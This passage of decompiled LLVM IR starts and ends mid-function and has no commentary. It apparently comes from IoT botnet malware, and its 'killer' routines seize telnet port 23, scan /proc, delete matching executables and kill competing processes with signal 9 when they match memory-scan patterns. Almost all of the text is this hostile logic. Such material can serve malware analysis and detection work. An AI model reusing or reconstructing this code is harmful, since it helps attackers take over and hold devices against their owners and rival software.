  %v2_12c14 = call i32 @__GI_time(i32* null)
  %v0_12c28 = call i32 @__libc_fork()
  store i32 %v0_12c28, i32* @killer_pid, align 4
  %v5_12c44 = icmp sgt i32 %v0_12c28, 0
  br i1 %v5_12c44, label %dec_label_pc_13170, label %dec_label_pc_12c48

dec_label_pc_12c48:                               ; preds = %entry
  %v3_12c50 = icmp eq i32 %v0_12c28, -1
  br i1 %v3_12c50, label %dec_label_pc_13170, label %dec_label_pc_12c5c

dec_label_pc_12c5c:                               ; preds = %dec_label_pc_12c48
  store i32 2, i32* %tmp_bind_addr_-84, align 4
  %v1_12c70 = call i32 @__GI_htons(i32 23)
  %v1_12c78 = trunc i32 %v1_12c70 to i16
  %v3_12c7c = call i8 @killer_kill_by_port(i16 %v1_12c78)
  %v1_12c84 = call i32 @__GI_htons(i32 23)
  %v3_12c9c = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_12cac = icmp eq i32 %v3_12c9c, -1
  br i1 %v7_12cac, label %dec_label_pc_12cd4, label %dec_label_pc_12cb4

dec_label_pc_12cb4:                               ; preds = %dec_label_pc_12c5c
  %v2_12cb4 = ptrtoint i32* %tmp_bind_addr_-84 to i32
  %v5_12cc4 = call i32 @bind(i32 %v3_12c9c, i32 %v2_12cb4, i32 16, i32 %v2_12cb4, i32 %v3_12c9c)
  %v2_12cd0 = call i32 @listen(i32 %v3_12c9c, i32 1)
  br label %dec_label_pc_12cd4

dec_label_pc_12cd4:                               ; preds = %dec_label_pc_12c5c, %dec_label_pc_12cb4
  %v1_12cd8 = call i32 @sleep(i32 5)
  %v1_12ce0 = call i32 @malloc(i32 4096)
  store i32 %v1_12ce0, i32* @killer_realpath.109, align 4
  %v3_12d00 = inttoptr i32 %v1_12ce0 to i8*
  store i8 0, i8* %v3_12d00, align 1
  store i32 0, i32* @killer_realpath_len, align 4
  %v2_12d10 = call i8 @has_exe_access()
  %v2_12d18 = icmp eq i8 %v2_12d10, 0
  br i1 %v2_12d18, label %dec_label_pc_13170, label %dec_label_pc_12d20.preheader

dec_label_pc_12d20.preheader:                     ; preds = %dec_label_pc_12cd4
  %v2_12d80 = ptrtoint [64 x i8]* %exe_path_-148 to i32
  %v4_12d84 = getelementptr inbounds [64 x i8], [64 x i8]* %exe_path_-148, i32 0, i32 0
  %v2_12d88 = ptrtoint [64 x i8]* %status_path_-212 to i32
  %v4_12f1c = getelementptr inbounds [64 x i8], [64 x i8]* %status_path_-212, i32 0, i32 0
  %v2_12fb0 = ptrtoint [4096 x i8]* %realpath_-4308 to i32
  %tmp45 = getelementptr inbounds [4096 x i8], [4096 x i8]* %realpath_-4308, i32 0, i32 0
  br label %dec_label_pc_12d20

dec_label_pc_12d20:                               ; preds = %dec_label_pc_12d20.preheader, %dec_label_pc_13164
  %dir_-56.0 = phi i32 [ %dir_-56.1.lcssa, %dec_label_pc_13164 ], [ 0, %dec_label_pc_12d20.preheader ]
  %tmp_bind_fd_-64.0 = phi i32 [ %tmp_bind_fd_-64.1.lcssa, %dec_label_pc_13164 ], [ %v2_12c14, %dec_label_pc_12d20.preheader ]
  %last_pid_scan_-68.0 = phi i32 [ %last_pid_scan_-68.2.lcssa, %dec_label_pc_13164 ], [ 400, %dec_label_pc_12d20.preheader ]
  call void @table_unlock_val(i8 6)
  %v3_12d30 = call i8* @table_retrieve_val(i32 6, i32* null)
  %v5_12d30 = ptrtoint i8* %v3_12d30 to i32
  %v1_12d3c = call i32 @__GI_opendir(i32 %v5_12d30)
  %v2_12d4c = icmp eq i32 %v1_12d3c, 0
  br i1 %v2_12d4c, label %dec_label_pc_13170, label %dec_label_pc_12d54

dec_label_pc_12d54:                               ; preds = %dec_label_pc_12d20
  call void @table_lock_val(i8 6)
  %v1_1314c = inttoptr i32 %v1_12d3c to i32*
  %v2_1314c7 = call i32 @__GI_readdir(i32* %v1_1314c)
  %v2_1315c9 = icmp eq i32 %v2_1314c7, 0
  br i1 %v2_1315c9, label %dec_label_pc_13164, label %dec_label_pc_12d60

dec_label_pc_12d60:                               ; preds = %dec_label_pc_12d54, %dec_label_pc_13148.backedge
  %v2_1314c13 = phi i32 [ %v2_1314c, %dec_label_pc_13148.backedge ], [ %v2_1314c7, %dec_label_pc_12d54 ]
  %last_pid_scan_-68.212 = phi i32 [ %last_pid_scan_-68.2.be, %dec_label_pc_13148.backedge ], [ %last_pid_scan_-68.0, %dec_label_pc_12d54 ]
  %tmp_bind_fd_-64.111 = phi i32 [ %tmp_bind_fd_-64.1.be, %dec_label_pc_13148.backedge ], [ %tmp_bind_fd_-64.0, %dec_label_pc_12d54 ]
  %dir_-56.110 = phi i32 [ %dir_-56.1.be, %dec_label_pc_13148.backedge ], [ %dir_-56.0, %dec_label_pc_12d54 ]
  %v1_12d64 = add i32 %v2_1314c13, 11
  %v2_12d64 = inttoptr i32 %v1_12d64 to i8*
  %v3_12d64 = load i8, i8* %v2_12d64, align 1
  %tmp = icmp ult i8 %v3_12d64, 48
  br i1 %tmp, label %dec_label_pc_13148.backedge, label %dec_label_pc_12d70

dec_label_pc_12d70:                               ; preds = %dec_label_pc_12d60
  %v3_12d74 = load i8, i8* %v2_12d64, align 1
  %tmp46 = icmp ugt i8 %v3_12d74, 57
  br i1 %tmp46, label %dec_label_pc_13148.backedge, label %dec_label_pc_12d80

dec_label_pc_12d80:                               ; preds = %dec_label_pc_12d70
  store i32 %v1_12d64, i32* @r0, align 4
  %v1_12d9c = call i32 @atol(i32 %v1_12d64)
  %v1_12dac = add i32 %dir_-56.110, 1
  %v8_12dc0 = icmp sgt i32 %v1_12d9c, %last_pid_scan_-68.212
  br i1 %v8_12dc0, label %dec_label_pc_12e4c, label %dec_label_pc_12dc4

dec_label_pc_12dc4:                               ; preds = %dec_label_pc_12d80
  %v2_12dc8 = call i32 @__GI_time(i32* null)
  %v2_12dd4 = sub i32 %v2_12dc8, %tmp_bind_fd_-64.111
  %v7_12ddc = icmp slt i32 %v2_12dd4, 601
  br i1 %v7_12ddc, label %dec_label_pc_12dec, label %dec_label_pc_12de0

dec_label_pc_12de0:                               ; preds = %dec_label_pc_12dc4
  br label %dec_label_pc_13148.backedge

dec_label_pc_12dec:                               ; preds = %dec_label_pc_12dc4
  %v7_12df4 = icmp slt i32 %v1_12d9c, 401
  br i1 %v7_12df4, label %dec_label_pc_13148.backedge, label %dec_label_pc_12df8

dec_label_pc_12df8:                               ; preds = %dec_label_pc_12dec
  %v1_12e00 = zext i32 %v1_12dac to i64
  %v4_12e00 = mul nuw i64 %v1_12e00, 3435973837
  %v3_12e041 = udiv i64 %v4_12e00, 34359738368
  %v2_12e183 = mul nuw nsw i64 %v3_12e041, 2
  %v2_12e18 = trunc i64 %v2_12e183 to i32
  %v3_12e1c5 = mul nuw nsw i64 %v3_12e041, 8
  %v3_12e1c = trunc i64 %v3_12e1c5 to i32
  %v2_12e20.neg = sub i32 %v1_12dac, %v2_12e18
  %v2_12e38 = icmp eq i32 %v2_12e20.neg, %v3_12e1c
  br i1 %v2_12e38, label %dec_label_pc_12e40, label %dec_label_pc_13148.backedge

dec_label_pc_12e40:                               ; preds = %dec_label_pc_12df8
  %v1_12e44 = call i32 @sleep(i32 1)
  br label %dec_label_pc_13148.backedge

dec_label_pc_12e4c:                               ; preds = %dec_label_pc_12d80
  %v2_12e68 = call i32 @__GI_time(i32* null)
  call void @table_unlock_val(i8 6)
  call void @table_unlock_val(i8 7)
  %v3_12e8c = call i8* @table_retrieve_val(i32 6, i32* null)
  %v6_12e9c = call i32 @util_strcpy(i8* %v4_12d84, i8* %v3_12e8c)
  %v2_12eac = add i32 %v6_12e9c, %v2_12d80
  %v4_12eb0 = inttoptr i32 %v2_12eac to i8*
  %v6_12ec4 = call i32 @util_strcpy(i8* %v4_12eb0, i8* nonnull %v2_12d64)
  %v2_12ed4 = add i32 %v6_12ec4, %v2_12eac
  %v4_12ed8 = inttoptr i32 %v2_12ed4 to i8*
  %v3_12ee4 = call i8* @table_retrieve_val(i32 7, i32* null)
  %v6_12ef4 = call i32 @util_strcpy(i8* %v4_12ed8, i8* %v3_12ee4)
  %v3_12f14 = call i8* @table_retrieve_val(i32 6, i32* null)
  %v6_12f24 = call i32 @util_strcpy(i8* %v4_12f1c, i8* %v3_12f14)
  %v2_12f34 = add i32 %v6_12f24, %v2_12d88
  %v4_12f44 = inttoptr i32 %v2_12f34 to i8*
  %v6_12f4c = call i32 @util_strcpy(i8* %v4_12f44, i8* nonnull %v2_12d64)
  %v2_12f5c = add i32 %v6_12f4c, %v2_12f34
  %v3_12f6c = call i8* @table_retrieve_val(i32 11, i32* null)
  %v4_12f74 = inttoptr i32 %v2_12f5c to i8*
  %v6_12f7c = call i32 @util_strcpy(i8* %v4_12f74, i8* %v3_12f6c)
  call void @table_lock_val(i8 6)
  call void @table_lock_val(i8 7)
  %v4_12fc4 = call i32 @readlink(i32 %v2_12d80, i32 %v2_12fb0, i32 4095, i32 %v2_12fb0)
  %v7_12fd4 = icmp eq i32 %v4_12fc4, -1
  br i1 %v7_12fd4, label %dec_label_pc_130fc, label %dec_label_pc_12fdc

dec_label_pc_12fdc:                               ; preds = %dec_label_pc_12e4c
  %v2_12ff0 = add i32 %v4_12fc4, %v2_12fb0
  %v3_12ff8 = inttoptr i32 %v2_12ff0 to i8*
  store i8 0, i8* %v3_12ff8, align 1
  call void @table_unlock_val(i8 10)
  %v1_13008 = add i32 %v4_12fc4, -1
  store i32 %v1_13008, i32* @r4, align 4
  %v3_13014 = call i8* @table_retrieve_val(i32 10, i32* null)
  %v0_1302c = load i32, i32* @r4, align 4
  %v7_13030 = call i32 @util_stristr(i8* %tmp45, i32 %v0_1302c, i8* %v3_13014)
  %v7_13038 = icmp eq i32 %v7_13030, -1
  br i1 %v7_13038, label %dec_label_pc_13060, label %dec_label_pc_13040

dec_label_pc_13040:                               ; preds = %dec_label_pc_12fdc
  %v1_13050 = call i32 @unlink(i32 %v2_12fb0)
  %v2_1305c = call i32 @kill(i32 %v1_12d9c, i32 9)
  br label %dec_label_pc_13060

dec_label_pc_13060:                               ; preds = %dec_label_pc_12fdc, %dec_label_pc_13040
  call void @table_lock_val(i8 10)
  %v0_13068 = call i32 @__getpid()
  store i32 %v0_13068, i32* @r0, align 4
  %v9_13074 = icmp eq i32 %v0_13068, %v1_12d9c
  br i1 %v9_13074, label %dec_label_pc_13148.backedge, label %dec_label_pc_1307c

dec_label_pc_1307c:                               ; preds = %dec_label_pc_13060
  %v0_1307c = call i32 @getppid()
  %v9_13088 = icmp eq i32 %v0_1307c, %v1_12d9c
  br i1 %v9_13088, label %dec_label_pc_13148.backedge, label %dec_label_pc_13090

dec_label_pc_13090:                               ; preds = %dec_label_pc_1307c
  %v2_13094 = load i32, i32* @killer_realpath.109, align 4
  %v4_130ac = inttoptr i32 %v2_13094 to i8*
  %v5_130ac = call i8 @util_strcmp(i8* %tmp45, i8* %v4_130ac)
  %v2_130b4 = icmp eq i8 %v5_130ac, 0
  br i1 %v2_130b4, label %dec_label_pc_130bc, label %dec_label_pc_13148.backedge

dec_label_pc_130bc:                               ; preds = %dec_label_pc_13090
  store i32 %v2_12fb0, i32* @r3, align 4
  %v2_130d0 = call i32 @__libc_open(i32 %v2_12fb0, i32 0)
  %v3_130e0 = icmp eq i32 %v2_130d0, -1
  br i1 %v3_130e0, label %dec_label_pc_130e8, label %dec_label_pc_130f4

dec_label_pc_130e8:                               ; preds = %dec_label_pc_130bc
  %v2_130f0 = call i32 @kill(i32 %v1_12d9c, i32 9)
  br label %dec_label_pc_130f4

dec_label_pc_130f4:                               ; preds = %dec_label_pc_130bc, %dec_label_pc_130e8
  %v1_130f8 = call i32 @__GI___libc_close(i32 %v2_130d0)
  br label %dec_label_pc_130fc

dec_label_pc_130fc:                               ; preds = %dec_label_pc_12e4c, %dec_label_pc_130f4
  %v4_13104 = call i8 @memory_scan_match(i8* %v4_12d84)
  %v2_1310c = icmp eq i8 %v4_13104, 0
  br i1 %v2_1310c, label %dec_label_pc_13120, label %dec_label_pc_13114

dec_label_pc_13114:                               ; preds = %dec_label_pc_130fc
  %v2_1311c = call i32 @kill(i32 %v1_12d9c, i32 9)
  br label %dec_label_pc_13120

dec_label_pc_13120:                               ; preds = %dec_label_pc_130fc, %dec_label_pc_13114
  call void @util_zero(i8* %v4_12d84, i32 64)
  call void @util_zero(i8* %v4_12f1c, i32 64)
  %v1_13144 = call i32 @sleep(i32 1)
  br label %dec_label_pc_13148.backedge

dec_label_pc_13148.backedge:                      ; preds = %dec_label_pc_13120, %dec_label_pc_12de0, %dec_label_pc_12e40, %dec_label_pc_12d60, %dec_label_pc_12d70, %dec_label_pc_12dec, %dec_label_pc_13060, %dec_label_pc_1307c, %dec_label_pc_12df8, %dec_label_pc_13090
  %dir_-56.1.be = phi i32 [ %dir_-56.110, %dec_label_pc_12d60 ], [ %dir_-56.110, %dec_label_pc_12d70 ], [ %v1_12dac, %dec_label_pc_13120 ], [ %v1_12dac, %dec_label_pc_13060 ], [ %v1_12dac, %dec_label_pc_1307c ], [ %v1_12dac, %dec_label_pc_13090 ], [ %v1_12dac, %dec_label_pc_12dec ], [ %v1_12dac, %dec_label_pc_12e40 ], [ %v1_12dac, %dec_label_pc_12df8 ], [ %v1_12dac, %dec_label_pc_12de0 ]
  %tmp_bind_fd_-64.1.be = phi i32 [ %tmp_bind_fd_-64.111, %dec_label_pc_12d60 ], [ %tmp_bind_fd_-64.111, %dec_label_pc_12d70 ], [ %v2_12e68, %dec_label_pc_13120 ], [ %v2_12e68, %dec_label_pc_13060 ], [ %v2_12e68, %dec_label_pc_1307c ], [ %v2_12e68, %dec_label_pc_13090 ], [ %tmp_bind_fd_-64.111, %dec_label_pc_12dec ], [ %tmp_bind_fd_-64.111, %dec_label_pc_12e40 ], [ %tmp_bind_fd_-64.111, %dec_label_pc_12df8 ], [ %tmp_bind_fd_-64.111, %dec_label_pc_12de0 ]
  %last_pid_scan_-68.2.be = phi i32 [ %last_pid_scan_-68.212, %dec_label_pc_12d60 ], [ %last_pid_scan_-68.212, %dec_label_pc_12d70 ], [ %v1_12d9c, %dec_label_pc_13120 ], [ %v1_12d9c, %dec_label_pc_13060 ], [ %v1_12d9c, %dec_label_pc_1307c ], [ %v1_12d9c, %dec_label_pc_13090 ], [ %last_pid_scan_-68.212, %dec_label_pc_12dec ], [ %last_pid_scan_-68.212, %dec_label_pc_12e40 ], [ %last_pid_scan_-68.212, %dec_label_pc_12df8 ], [ 400, %dec_label_pc_12de0 ]
  %v2_1314c = call i32 @__GI_readdir(i32* %v1_1314c)
  %v2_1315c = icmp eq i32 %v2_1314c, 0
  br i1 %v2_1315c, label %dec_label_pc_13164, label %dec_label_pc_12d60

dec_label_pc_13164:                               ; preds = %dec_label_pc_13148.backedge, %dec_label_pc_12d54
  %dir_-56.1.lcssa = phi i32 [ %dir_-56.0, %dec_label_pc_12d54 ], [ %dir_-56.1.be, %dec_label_pc_13148.backedge ]
  %tmp_bind_fd_-64.1.lcssa = phi i32 [ %tmp_bind_fd_-64.0, %dec_label_pc_12d54 ], [ %tmp_bind_fd_-64.1.be, %dec_label_pc_13148.backedge ]
  %last_pid_scan_-68.2.lcssa = phi i32 [ %last_pid_scan_-68.0, %dec_label_pc_12d54 ], [ %last_pid_scan_-68.2.be, %dec_label_pc_13148.backedge ]
  %v2_13168 = call i32 @__GI_closedir(i32* %v1_1314c)
  br label %dec_label_pc_12d20

dec_label_pc_13170:                               ; preds = %dec_label_pc_12d20, %dec_label_pc_12c48, %dec_label_pc_12cd4, %entry
  store i32 %v3_12bf8, i32* @r4, align 4
  store i32 %v6_12bf8, i32* @fp, align 4
  ret void

; uselistorder directives
  uselistorder i32 %v2_1314c, { 1, 0 }
  uselistorder i32 %v4_12fc4, { 2, 1, 0 }
  uselistorder i32 %v1_12dac, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32 %v1_12d9c, { 0, 1, 2, 3, 9, 6, 7, 8, 5, 4, 10 }
  uselistorder i32 %v1_12d64, { 1, 0, 2 }
  uselistorder i32 %dir_-56.110, { 2, 1, 0 }
  uselistorder i32 %tmp_bind_fd_-64.111, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %last_pid_scan_-68.212, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %v1_1314c, { 0, 2, 1 }
  uselistorder i32 %last_pid_scan_-68.0, { 1, 0 }
  uselistorder i32 %tmp_bind_fd_-64.0, { 1, 0 }
  uselistorder i32 %dir_-56.0, { 1, 0 }
  uselistorder i32 %v2_12fb0, { 3, 4, 2, 0, 1, 5 }
  uselistorder i8* %v4_12d84, { 1, 2, 0 }
  uselistorder i32 %v2_12d80, { 1, 0 }
  uselistorder i32 %v3_12c9c, { 2, 3, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %tmp_bind_addr_-84, { 1, 0 }
  uselistorder i32 400, { 1, 0 }
  uselistorder label %dec_label_pc_13170, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_13148.backedge, { 0, 9, 7, 6, 2, 8, 5, 1, 4, 3 }
  uselistorder label %dec_label_pc_13120, { 1, 0 }
  uselistorder label %dec_label_pc_130fc, { 1, 0 }
  uselistorder label %dec_label_pc_130f4, { 1, 0 }
  uselistorder label %dec_label_pc_13060, { 1, 0 }
  uselistorder label %dec_label_pc_12d60, { 1, 0 }
  uselistorder label %dec_label_pc_12d20, { 1, 0 }
  uselistorder label %dec_label_pc_12cd4, { 1, 0 }
}

define void @killer_kill() local_unnamed_addr {
entry:
  %v3_13190 = load i32, i32* @fp, align 4
  %v2_1319c = load i32, i32* @killer_pid, align 4
  %v2_131a8 = call i32 @kill(i32 %v2_1319c, i32 9)
  store i32 %v3_13190, i32* @fp, align 4
  ret void

; uselistorder directives
  uselistorder i32* @killer_pid, { 1, 0 }
}

define i8 @killer_kill_by_port(i16 %port) local_unnamed_addr {
entry:
  %port_str_-8817 = alloca [16 x i8], align 1
  %inode_-8801 = alloca [16 x i8], align 1
  %ptr_path_-8785 = alloca i8*, align 4
  %exe_-8272 = alloca [4096 x i8], align 1
  %path_-4176 = alloca [4096 x i8], align 1
  %stack_var_-4 = alloca i32, align 4
  %v3_131c0 = load i32, i32* @r4, align 4
  %v6_131c0 = load i32, i32* @fp, align 4
  store i32 78280, i32* %stack_var_-4, align 4
  %v2_131c4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_131c4, i32* @fp, align 4
  %v6_131e0 = trunc i16 %port to i8
  %v3_131f0 = ptrtoint [4096 x i8]* %path_-4176 to i32
  %v3_13200 = getelementptr inbounds [4096 x i8], [4096 x i8]* %path_-4176, i32 0, i32 0
  %v4_13200 = call i32 @__GI_memset(i8* %v3_13200, i32 0, i32 4096)
  %v3_13210 = ptrtoint [4096 x i8]* %exe_-8272 to i32
  %v3_13220 = getelementptr inbounds [4096 x i8], [4096 x i8]* %exe_-8272, i32 0, i32 0
  %v4_13220 = call i32 @__GI_memset(i8* %v3_13220, i32 0, i32 4096)
  %v3_13230 = ptrtoint i8** %ptr_path_-8785 to i32
  %v3_13248 = bitcast i8** %ptr_path_-8785 to i8*
  %v4_13248 = call i32 @__GI_memset(i8* %v3_13248, i32 0, i32 513)
  %v3_13278 = getelementptr inbounds [16 x i8], [16 x i8]* %inode_-8801, i32 0, i32 0
  %v4_13278 = call i32 @__GI_memset(i8* %v3_13278, i32 0, i32 16)
  %v1_132a8 = sext i8 %v6_131e0 to i32
  %v2_132a8 = call i32 @__GI_ntohs(i32 %v1_132a8)
  %tmp150 = getelementptr inbounds [16 x i8], [16 x i8]* %port_str_-8817, i32 0, i32 0
  %v5_132cc = call i8* @util_itoa(i32 %v2_132a8, i32 16, i8* %tmp150)
  %v3_132e0 = call i32 @util_strlen(i8* %tmp150)
  %v7_132e8 = icmp eq i32 %v3_132e0, 2
  br i1 %v7_132e8, label %dec_label_pc_132f0, label %dec_label_pc_133b0

dec_label_pc_132f0:                               ; preds = %entry
  store i8 48, i8* %tmp150, align 1
  br label %dec_label_pc_133b0

dec_label_pc_133b0:                               ; preds = %entry, %dec_label_pc_132f0
  call void @table_unlock_val(i8 6)
  call void @table_unlock_val(i8 7)
  call void @table_unlock_val(i8 9)
  %v3_133d0 = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_22e4c.114 to i32), i32 0)
  %v4_133e0 = icmp eq i32 %v3_133d0, -1
  br i1 %v4_133e0, label %dec_label_pc_133e8, label %dec_label_pc_13784

dec_label_pc_133e8:                               ; preds = %dec_label_pc_133b0
  br label %dec_label_pc_13bac

dec_label_pc_1340c:                               ; preds = %dec_label_pc_1343c
  %v1_13410 = add i32 %storemerge28, 1
  %v2_1342c = add i32 %v1_13410, %v3_13230
  %v1_13430 = inttoptr i32 %v2_1342c to i8*
  %v2_13430 = load i8, i8* %v1_13430, align 1
  %v2_13434 = icmp eq i8 %v2_13430, 0
  br i1 %v2_13434, label %dec_label_pc_13460, label %dec_label_pc_1343c

dec_label_pc_1343c:                               ; preds = %dec_label_pc_13418.preheader, %dec_label_pc_1340c
  %v1_1343030 = phi i8* [ %v1_13430, %dec_label_pc_1340c ], [ %v3_13248, %dec_label_pc_13418.preheader ]
  %storemerge28 = phi i32 [ %v1_13410, %dec_label_pc_1340c ], [ 0, %dec_label_pc_13418.preheader ]
  %v2_13454 = load i8, i8* %v1_1343030, align 1
  %v7_13458 = icmp eq i8 %v2_13454, 58
  br i1 %v7_13458, label %dec_label_pc_13460, label %dec_label_pc_1340c

dec_label_pc_13460:                               ; preds = %dec_label_pc_1340c, %dec_label_pc_1343c, %dec_label_pc_13418.preheader
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_13418.preheader ], [ %v1_13410, %dec_label_pc_1340c ], [ %storemerge28, %dec_label_pc_1343c ]
  %v1_13430.lcssa = phi i8* [ %v3_13248, %dec_label_pc_13418.preheader ], [ %v1_13430, %dec_label_pc_1340c ], [ %v1_1343030, %dec_label_pc_1343c ]
  %v2_13478 = load i8, i8* %v1_13430.lcssa, align 1
  %v2_1347c = icmp eq i8 %v2_13478, 0
  br i1 %v2_1347c, label %dec_label_pc_13784, label %dec_label_pc_13484

dec_label_pc_13484:                               ; preds = %dec_label_pc_13460
  %v1_13488 = add i32 %storemerge.lcssa, 2
  %v2_134bc37 = add i32 %v1_13488, %v3_13230
  %v1_134c038 = inttoptr i32 %v2_134bc37 to i8*
  %v2_134c039 = load i8, i8* %v1_134c038, align 1
  %v2_134c441 = icmp eq i8 %v2_134c039, 0
  br i1 %v2_134c441, label %dec_label_pc_134f0, label %dec_label_pc_134cc

dec_label_pc_1349c:                               ; preds = %dec_label_pc_134cc
  %v1_134a0 = add i32 %storemerge242, 1
  %v2_134bc = add i32 %v1_134a0, %v3_13230
  %v1_134c0 = inttoptr i32 %v2_134bc to i8*
  %v2_134c0 = load i8, i8* %v1_134c0, align 1
  %v2_134c4 = icmp eq i8 %v2_134c0, 0
  br i1 %v2_134c4, label %dec_label_pc_134f0, label %dec_label_pc_134cc

dec_label_pc_134cc:                               ; preds = %dec_label_pc_13484, %dec_label_pc_1349c
  %v1_134c044 = phi i8* [ %v1_134c0, %dec_label_pc_1349c ], [ %v1_134c038, %dec_label_pc_13484 ]
  %storemerge242 = phi i32 [ %v1_134a0, %dec_label_pc_1349c ], [ %v1_13488, %dec_label_pc_13484 ]
  %v2_134e4 = load i8, i8* %v1_134c044, align 1
  %v7_134e8 = icmp eq i8 %v2_134e4, 32
  br i1 %v7_134e8, label %dec_label_pc_134f0, label %dec_label_pc_1349c

dec_label_pc_134f0:                               ; preds = %dec_label_pc_1349c, %dec_label_pc_134cc, %dec_label_pc_13484
  %storemerge2.lcssa = phi i32 [ %v1_13488, %dec_label_pc_13484 ], [ %v1_134a0, %dec_label_pc_1349c ], [ %storemerge242, %dec_label_pc_134cc ]
  %v1_134c0.lcssa = phi i8* [ %v1_134c038, %dec_label_pc_13484 ], [ %v1_134c0, %dec_label_pc_1349c ], [ %v1_134c044, %dec_label_pc_134cc ]
  store i8 0, i8* %v1_134c0.lcssa, align 1
  store i32 %v2_134bc37, i32* @r4, align 4
  %v3_1354c = call i32 @util_strlen(i8* %v1_134c038)
  %v0_13560 = load i32, i32* @r4, align 4
  %v1_13560 = inttoptr i32 %v0_13560 to i8*
  %v7_1356c = call i32 @util_stristr(i8* %v1_13560, i32 %v3_1354c, i8* %tmp150)
  %v7_13574 = icmp eq i32 %v7_1356c, -1
  br i1 %v7_13574, label %dec_label_pc_13784, label %dec_label_pc_1357c

dec_label_pc_1357c:                               ; preds = %dec_label_pc_134f0
  %v1_13514 = add i32 %storemerge2.lcssa, 1
  br label %dec_label_pc_13660.lr.ph

dec_label_pc_13598:                               ; preds = %dec_label_pc_13660.lr.ph, %dec_label_pc_135e0
  %v1_13684171 = phi i8* [ %v1_13684, %dec_label_pc_135e0 ], [ %v1_13684163, %dec_label_pc_13660.lr.ph ]
  %ii_-48.252167 = phi i32 [ %v1_13664169, %dec_label_pc_135e0 ], [ %ii_-48.2.ph61, %dec_label_pc_13660.lr.ph ]
  %v1_13664169 = phi i32 [ %v1_13664, %dec_label_pc_135e0 ], [ %v1_13664161, %dec_label_pc_13660.lr.ph ]
  %in_column_-34.051168 = phi i8 [ 1, %dec_label_pc_135e0 ], [ 0, %dec_label_pc_13660.lr.ph ]
  %v2_135b0 = load i8, i8* %v1_13684171, align 1
  %v7_135b4 = icmp eq i8 %v2_135b0, 32
  br i1 %v7_135b4, label %dec_label_pc_135e0, label %dec_label_pc_135bc

dec_label_pc_135bc:                               ; preds = %dec_label_pc_13598
  %v2_135d4 = load i8, i8* %v1_13684171, align 1
  %v7_135d8 = icmp eq i8 %v2_135d4, 9
  br i1 %v7_135d8, label %dec_label_pc_135e0, label %dec_label_pc_135ec

dec_label_pc_135e0:                               ; preds = %dec_label_pc_135bc, %dec_label_pc_13598
  %v1_13664 = add i32 %v1_13664169, 1
  %v2_13680 = add i32 %v1_13664, %v3_13230
  %v1_13684 = inttoptr i32 %v2_13680 to i8*
  %v2_13684 = load i8, i8* %v1_13684, align 1
  %v2_13688 = icmp eq i8 %v2_13684, 0
  br i1 %v2_13688, label %dec_label_pc_13690, label %dec_label_pc_13598

dec_label_pc_135ec:                               ; preds = %dec_label_pc_135bc
  %v7_135f0 = icmp eq i8 %in_column_-34.051168, 1
  br i1 %v7_135f0, label %dec_label_pc_13610, label %dec_label_pc_13604

dec_label_pc_13604:                               ; preds = %dec_label_pc_135ec
  br label %dec_label_pc_1364c

dec_label_pc_13610:                               ; preds = %dec_label_pc_135ec
  %v1_135fc = add i32 %column_index_-40.1.ph59, 1
  %v7_13614 = icmp eq i32 %column_index_-40.1.ph59, 0
  br i1 %v7_13614, label %dec_label_pc_1361c, label %dec_label_pc_1364c

dec_label_pc_1361c:                               ; preds = %dec_label_pc_13610
  %v1_13620 = add i32 %ii_-48.252167, 2
  %v2_13634 = add i32 %v1_13620, %v3_13230
  %v1_13638 = inttoptr i32 %v2_13634 to i8*
  %v2_13638 = load i8, i8* %v1_13638, align 1
  %v7_1363c = icmp eq i8 %v2_13638, 65
  br i1 %v7_1363c, label %dec_label_pc_13644, label %dec_label_pc_1364c

dec_label_pc_13644:                               ; preds = %dec_label_pc_1361c
  br label %dec_label_pc_1364c

dec_label_pc_1364c:                               ; preds = %dec_label_pc_13604, %dec_label_pc_1361c, %dec_label_pc_13610, %dec_label_pc_13644
  %column_index_-40.04 = phi i32 [ 1, %dec_label_pc_13644 ], [ 1, %dec_label_pc_1361c ], [ %v1_135fc, %dec_label_pc_13610 ], [ %column_index_-40.1.ph59, %dec_label_pc_13604 ]
  %listening_state_-33.0 = phi i8 [ 1, %dec_label_pc_13644 ], [ %listening_state_-33.1.ph60, %dec_label_pc_1361c ], [ %listening_state_-33.1.ph60, %dec_label_pc_13610 ], [ %listening_state_-33.1.ph60, %dec_label_pc_13604 ]
  %v8_1365c = icmp sgt i32 %column_index_-40.04, 6
  br i1 %v8_1365c, label %dec_label_pc_13690, label %dec_label_pc_13660.lr.ph

dec_label_pc_13660.lr.ph:                         ; preds = %dec_label_pc_1357c, %dec_label_pc_1364c
  %ii_-48.2.ph61 = phi i32 [ %v1_13514, %dec_label_pc_1357c ], [ %v1_13664169, %dec_label_pc_1364c ]
  %listening_state_-33.1.ph60 = phi i8 [ 0, %dec_label_pc_1357c ], [ %listening_state_-33.0, %dec_label_pc_1364c ]
  %column_index_-40.1.ph59 = phi i32 [ 0, %dec_label_pc_1357c ], [ %column_index_-40.04, %dec_label_pc_1364c ]
  %v1_13664161 = add i32 %ii_-48.2.ph61, 1
  %v2_13680162 = add i32 %v1_13664161, %v3_13230
  %v1_13684163 = inttoptr i32 %v2_13680162 to i8*
  %v2_13684164 = load i8, i8* %v1_13684163, align 1
  %v2_13688166 = icmp eq i8 %v2_13684164, 0
  br i1 %v2_13688166, label %dec_label_pc_13690, label %dec_label_pc_13598

dec_label_pc_13690:                               ; preds = %dec_label_pc_1364c, %dec_label_pc_13660.lr.ph, %dec_label_pc_135e0
  %v1_13664157 = phi i32 [ %v1_13664161, %dec_label_pc_13660.lr.ph ], [ %v1_13664, %dec_label_pc_135e0 ], [ %v1_13664169, %dec_label_pc_1364c ]
  %v1_13684153 = phi i8* [ %v1_13684163, %dec_label_pc_13660.lr.ph ], [ %v1_13684, %dec_label_pc_135e0 ], [ %v1_13684171, %dec_label_pc_1364c ]
  %listening_state_-33.1.ph.lcssa = phi i8 [ %listening_state_-33.1.ph60, %dec_label_pc_13660.lr.ph ], [ %listening_state_-33.1.ph60, %dec_label_pc_135e0 ], [ %listening_state_-33.0, %dec_label_pc_1364c ]
